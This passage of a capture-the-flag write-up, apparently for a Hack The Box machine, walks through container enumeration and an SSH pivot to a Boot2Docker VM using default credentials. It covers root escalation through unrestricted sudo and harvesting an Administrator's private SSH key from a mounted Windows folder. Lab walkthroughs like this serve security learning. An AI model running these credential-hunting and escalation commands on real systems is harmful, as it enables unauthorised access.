+<pre class="z-code"><code><span class="z-text z-plain">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+</span><span class="z-text z-plain">        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 312  bytes 54800 (53.5 KiB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 263  bytes 83551 (81.5 KiB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
+</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
+</span><span class="z-text z-plain">        RX packets 795  bytes 251363 (245.4 KiB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 795  bytes 251363 (245.4 KiB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">sit0: flags=128&lt;NOARP&gt;  mtu 1480
+</span><span class="z-text z-plain">        sit  txqueuelen 1000  (IPv6-in-IPv4)
+</span><span class="z-text z-plain">        RX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 0  bytes 0 (0.0 B)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></code></pre>
+<p>So there's the loopback interface and the Ethernet interface, but also a <code>sit0</code> interface.</p>
+<p>If we search online, we learn that this is a special fallback device set up by the <code>sit</code> kernel module, a tunneling protocol for using IPv6 over an existing IPv4 connection. But it's not interesting at the moment.</p>
+<p>What is really interesting is that the Ethernet interface is set to <code>172.17.0.2</code>... Perhaps the VM's IP is <code>172.17.0.1</code>?</p>
+<h2 id="home-folder">Home folder</h2>
+<p>Before trying to pivot to the VM, let's explore our home folder. Let's find its location:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> awk<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span>: <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/^postgres:/ {print $6}<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> /etc/passwd</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/var/lib/postgresql
+</span></code></pre>
+<p>Alright, so let's see what it contains.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /var/lib/postgresql</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-xr-x 1 postgres postgres 4096 Feb  8  2021 .
+</span><span class="z-text z-plain">drwxr-xr-x 1 root     root     4096 Feb 19  2020 ..
+</span><span class="z-text z-plain">lrwxrwxrwx 1 root     root        9 Feb  8  2021 .bash_history -&gt; /dev/null
+</span><span class="z-text z-plain">lrwxrwxrwx 1 root     root        9 Feb  8  2021 .psql_history -&gt; /dev/null
+</span><span class="z-text z-plain">drwx------ 2 postgres postgres 4096 Feb 19  2020 .ssh
+</span><span class="z-text z-plain">drwxr-xr-x 1 postgres postgres 4096 Feb 18  2020 11
+</span><span class="z-text z-plain">-rw-r--r-- 1 root     root       43 Feb  8  2021 user.txt
+</span></code></pre>
+<p>The user flag is here! Let's grab it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /var/lib/postgresql/user.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">f0183e44378ea9774433e2ca6ac78c6a  flag.txt
+</span></code></pre>
+<p>I'm not sure why there's <code>flag.txt</code> after the flag string, but let's ignore that.</p>
+<h1 id="pivoting-ssh">Pivoting (SSH)</h1>
+<p>Let's try to SSH into the VM from the container using the default credentials for Boot2Docker.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh docker@172.17.0.1</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">docker@172.17.0.1&#39;s password:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   ( &#39;&gt;&#39;)
+</span><span class="z-text z-plain">  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
+</span><span class="z-text z-plain"> (/-_--_-\)           www.tinycorelinux.net
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">docker@box:~$
+</span></code></pre>
+<p>It worked! We're now inside the VM.</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got access as <code>docker</code>.</p>
+<h2 id="distribution-1">Distribution</h2>
+<p>Let's see which distribution this VM is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/os-release</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">NAME=Boot2Docker
+</span><span class="z-text z-plain">VERSION=19.03.5
+</span><span class="z-text z-plain">ID=boot2docker
+</span><span class="z-text z-plain">ID_LIKE=tcl
+</span><span class="z-text z-plain">VERSION_ID=19.03.5
+</span><span class="z-text z-plain">PRETTY_NAME=&quot;Boot2Docker 19.03.5 (TCL 10.1)&quot;
+</span><span class="z-text z-plain">ANSI_COLOR=&quot;1;34&quot;
+</span><span class="z-text z-plain">HOME_URL=&quot;https://github.com/boot2docker/boot2docker&quot;
+</span><span class="z-text z-plain">SUPPORT_URL=&quot;https://blog.docker.com/2016/11/introducing-docker-community-directory-docker-community-slack/&quot;
+</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;https://github.com/boot2docker/boot2docker/issues&quot;
+</span></code></pre>
+<p>So this is Boot2Docker. Predictable. I searched <a href="https://www.exploit-db.com/">ExploitDB</a> for a vulnerability affecting this software version, but I found nothing.</p>
+<h2 id="architecture-1">Architecture</h2>
+<p>What is this VM's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="kernel-1">Kernel</h2>
+<p>Maybe this container is vulnerable to a kernel exploit?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4.14.154-boot2docker
+</span></code></pre>
+<p>Same as the container.</p>
+<h2 id="apparmor">AppArmor</h2>
+<p>Let's list the applications AppArmor profiles:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lap</span> /etc/apparmor.d/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ls: cannot access &#39;/etc/apparmor.d/&#39;: No such file or directory
+</span></code></pre>
+<p>Nothing.</p>
+<h2 id="nics-1">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 ::1/128 scope host 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 08:00:27:f2:5e:be brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 fe80::a00:27ff:fef2:5ebe/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 08:00:27:2c:6d:87 brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 192.168.99.100/24 brd 192.168.99.255 scope global eth1
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 fe80::a00:27ff:fe2c:6d87/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">4: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/sit 0.0.0.0 brd 0.0.0.0
+</span><span class="z-text z-plain">5: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+</span><span class="z-text z-plain">    link/ether 02:42:c5:9b:a5:3b brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 fe80::42:c5ff:fe9b:a53b/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">7: veth18d20dd@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default 
+</span><span class="z-text z-plain">    link/ether 7e:a4:73:6a:bc:bb brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet6 fe80::7ca4:73ff:fe6a:bcbb/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>Waouh, there's a few of them.</p>
+<p>There's the classic loopback interface, but also two Ethernet interfaces, and a <code>sit0</code> interface (same as the container).</p>
+<p>We also see a Docker interface, whose IPv4 is the one we used for SSH, and a <code>veth18d20dd</code> interface.</p>
+<h2 id="hostname">Hostname</h2>
+<p>What is this VM's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">box
+</span></code></pre>
+<p>Okay. I guess that's good to know.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all the local users that have a console.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/passwd</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">tc
+</span><span class="z-text z-plain">docker
+</span></code></pre>
+<p>So there's us, <code>docker</code>, and also <code>lp</code>, <code>tc</code> and <code>root</code>.</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's retrieve the list of all local groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> getent group</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">-bash: getent: command not found
+</span></code></pre>
+<p>It doesn't work.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's see to which groups we currently belong</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> groups</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">-bash: groups: command not found
+</span></code></pre>
+<p>It doesn't exist either!</p>
+<h2 id="home-folder-1">Home folder</h2>
+<p>Let's list the content of our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-sr-x    4 docker   staff          160 Dec 27 10:47 .
+</span><span class="z-text z-plain">drwxrwxr-x    4 root     staff           80 Dec 27 10:44 ..
+</span><span class="z-text z-plain">-rw-rw-r--    1 docker   staff            0 Oct 19  2019 .ash_history
+</span><span class="z-text z-plain">-rw-r--r--    1 docker   staff          446 Oct 19  2019 .ashrc
+</span><span class="z-text z-plain">-rw-rw-r--    1 docker   staff           29 Feb 21  2010 .bashrc
+</span><span class="z-text z-plain">drwx------    2 docker   staff          100 Dec 27 10:47 .docker
+</span><span class="z-text z-plain">-rw-r--r--    1 docker   staff           20 Oct 19  2019 .profile
+</span><span class="z-text z-plain">drwx------    2 docker   staff          100 Jan  1  1970 .ssh
+</span></code></pre>
+<p>We don't find the user flag, and there's only hidden files and folders. We can explore them, but we find nothing.</p>
+<p>If we list the content of <code>/home</code>, we find a home folder named <code>dockremap</code>. Once again we can explore it, but it's similar to our home folder, and there's nothing interesting.</p>
+<h2 id="command-history">Command history</h2>
+<p>If we print the content of the history files in the home folders we have access to, we see that they are empty.</p>
+<h2 id="sudo-permissions">Sudo permissions</h2>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">User docker may run the following commands on this host:
+</span><span class="z-text z-plain">    (root) NOPASSWD: ALL
+</span></code></pre>
+<p>Waouh, we can run anything as <code>root</code>!</p>
+<h1 id="privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</h1>
+<p>Since we can execute anything as <code>root</code>, we can easily get an elevated shell.</p>
+<h2 id="preparation-1">Preparation</h2>
+<p>Let's find which shells are installed on the system.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>^#<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> /etc/shells</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/bin/sh
+</span><span class="z-text z-plain">/bin/ash
+</span></code></pre>
+<p>Apparently there's only <code>sh</code> and <code>ash</code>... let's make sure this is the case.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> awk<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span>: <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>{print $7}<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span> /etc/passwd</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">uniq</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/bin/bash
+</span><span class="z-text z-plain">/bin/false
+</span><span class="z-text z-plain">/bin/sh
+</span></code></pre>
+<p>There's also <code>bash</code>!</p>
+<p>Let's search <a href="https://gtfobins.github.io/">GTFOBins</a> for this binary. We find <a href="https://gtfobins.github.io/gtfobins/bash/">one entry</a>, and there's <a href="https://gtfobins.github.io/gtfobins/bash/#sudo">a section</a> to abuse <code>sudo</code> rights!</p>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>Let's run the given command to get an elevated shell:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">docker@box:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo bash</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root@box:/home/docker#
+</span></code></pre>
+<p>Nice! If we run <code>whoami</code>, we can confirm that we are <code>root</code>.</p>
+<h1 id="local-enumeration-2">Local enumeration</h1>
+<h2 id="home-folder-2">Home folder</h2>
+<p>If we check the content of <code>/root</code>, we only find a <code>.Xdefaults</code> and a <code>.profile</code> files.</p>
+<h2 id="c-folder"><code>/c</code> folder</h2>
+<p>If we check the root of the filesystem, we find an unusual folder: <code>c</code>. Let's get its content.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@box:/home/docker#</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /c</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-xr-x    3 root     root            60 Dec 27 10:47 .
+</span><span class="z-text z-plain">drwxr-xr-x   17 root     root           440 Dec 27 10:47 ..
+</span><span class="z-text z-plain">dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 Users
+</span></code></pre>
+<p>Oh? That's interesting. Let's see what this <code>Users</code> folder contains.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@box:/home/docker#</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /c/Users</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 .
+</span><span class="z-text z-plain">drwxr-xr-x    3 root     root            60 Dec 27 10:47 ..
+</span><span class="z-text z-plain">drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 Administrator
+</span><span class="z-text z-plain">ls: /c/Users/All Users: cannot read link: Protocol error
+</span><span class="z-text z-plain">lrwxrwxrwx    1 docker   staff            0 Sep 15  2018 All Users
+</span><span class="z-text z-plain">dr-xr-xr-x    1 docker   staff         8192 Feb 18  2020 Default
+</span><span class="z-text z-plain">dr-xr-xr-x    1 docker   staff         8192 Feb 18  2020 Default User
+</span><span class="z-text z-plain">dr-xr-xr-x    1 docker   staff         4096 Feb 18  2020 Public
+</span><span class="z-text z-plain">drwxrwxrwx    1 docker   staff         8192 Feb 18  2020 Tony
+</span><span class="z-text z-plain">-rwxrwxrwx    1 docker   staff          174 Sep 15  2018 desktop.ini
+</span></code></pre>
+<p>It really looks like a Windows <code>Users</code> folder!</p>
+<p>It probably means that a user on Toolbox mounted this folder in the <code>c</code> directory, to have access to some files more easily.</p>
+<p>If we explore the folders at our disposal, we find the root flag. But for good measure, let's try to obtain a proper shell as <code>Administrator</code>.</p>
+<h1 id="pivoting-ssh-1">Pivoting (SSH)</h1>
+<p>If we explore the <code>Administrator</code> folder, we find a <code>.ssh</code> folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@box:/home/docker#</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /c/Users/Administrator/.ssh</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .
+</span><span class="z-text z-plain">drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 ..
+</span><span class="z-text z-plain">-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 authorized_keys
+</span><span class="z-text z-plain">-rwxrwxrwx    1 docker   staff         1675 Feb 19  2020 id_rsa
+</span><span class="z-text z-plain">-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 id_rsa.pub
+</span><span class="z-text z-plain">-rwxrwxrwx    1 docker   staff          348 Feb 19  2020 known_hosts
+</span></code></pre>
+<p>It contains a public and a private key. If we compare the content of <code>authorized_keys</code> and of the public key, we see that they match:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@box:/home/docker#</span></span><span class="z-meta z-function-call z-arguments z-shell"> diff /c/Users/Administrator/.ssh/authorized_keys /c/Users/Administrator/.ssh/id_rsa.pub</span>
+</span></code></pre>
+<h2 id="check">Check</h2>
+<p>Let's make sure that the private key really corresponds to the public key.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@box:/home/docker#</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh-keygen<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>y</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> /c/Users/Administrator/.ssh/id_rsa</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">---- BEGIN SSH2 PUBLIC KEY ----
+</span><span class="z-text z-plain">Comment: &quot;2048-bit RSA, converted by root@box from OpenSSH&quot;
+</span><span class="z-text z-plain">AAAAB3NzaC1yc2EAAAADAQABAAABAQC+jhIuWD92RK0DiMNQ3GAXyRs0AX7ohgs044J6ml
+</span><span class="z-text z-plain">+PPpFI5C8x3TxpsbKeEozOyKJUJ4miP0vwZ9JcZkh+wAhZef2fI1oN0CmgXsx+bUoi2A75
+</span><span class="z-text z-plain">b2YzuUCuzjOAHMwZCV4iyRC9ZNwqtA10IOP0nE0huFguEleCuj67l1boRxjOrYxI5GbsD5
+</span><span class="z-text z-plain">5d+Y+92viETTA1QjDHag4+vZ24F+bG6EvyZlBa7lTX4il7Y2/h8BRiEoZNYePihyNTAb1d
+</span><span class="z-text z-plain">xTSIjilwdPedc8qYaOg/KI/OlrlZ2InxCkwTf3w2d7iafE5uhZOneMZonUa6dkLKJzSJLB
